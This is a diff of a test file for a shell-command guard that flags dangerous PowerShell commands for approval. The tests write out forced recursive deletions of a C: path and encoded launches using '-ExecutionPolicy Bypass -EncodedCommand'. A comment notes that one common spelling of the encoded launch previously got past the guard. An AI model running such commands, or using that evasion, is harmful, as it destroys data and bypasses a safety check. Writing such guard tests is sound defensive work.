+    'Remove-Item -Re -Fo C:\\x', 'Remove-Item -Rec -For C:\\x',
+    'rm -Re -Fo C:\\x', 'del -Fo C:\\x',
+  ]) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'ask', command)
+  }
+  // -Filter and -ReadOnly share the -Re/-Fi prefixes but are not destructive.
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Remove-Item x -Filter *.log' }), null)
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-ChildItem -Recurse -File' }), null)
+})
+
+test('PS_ENCODED survives valued prefix options (-ExecutionPolicy Bypass -EncodedCommand)', () => {
+  // Verified live allow: `powershell -ExecutionPolicy Bypass -EncodedCommand`
+  // — the prefix chain only admitted VALUELESS flags, so the single most
+  // common real-world spelling of an encoded launch evaded the pattern.
+  const active = new Set([guardId('dangerous-shell')])
+  assert.equal(
+    evaluateGuards(active, 'pwsh', { command: 'powershell -ExecutionPolicy Bypass -EncodedCommand ZQBj' })?.decision.kind,
+    'ask',
+  )
+  assert.equal(
+    evaluateGuards(active, 'pwsh', { command: 'powershell -NoProfile -ExecutionPolicy Bypass -enc ZQBj' })?.decision.kind,
+    'ask',
+  )
+  // The -eq false positive fix must survive: comparison operators and ordinary
+  // cmdlet flags still pass.
+  assert.equal(evaluateGuards(active, 'pwsh', { command: '$a = 1; if ($a -eq 2) { pwsh -File x.ps1 }' }), null)
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-Process | Where-Object { $_.Name -eq "pwsh" }' }), null)
 })
